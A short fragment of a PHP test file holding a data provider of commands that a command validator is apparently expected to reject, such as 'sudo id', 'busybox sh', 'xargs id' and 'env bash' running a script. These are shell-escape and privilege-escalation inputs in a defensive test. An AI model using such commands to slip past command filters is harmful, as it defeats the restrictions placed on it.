     *
     * @return array<string, array{string}>
     */
    public static function rejectBinaryShellProvider(): array
    {
        return [
            'env bash' => ['env bash /app/x.sh'],
            'make -f' => ['make -f /tmp/Makefile'],
            'xargs' => ['xargs id'],
            'sudo' => ['sudo id'],
            'busybox' => ['busybox sh'],
        ];
    }
}
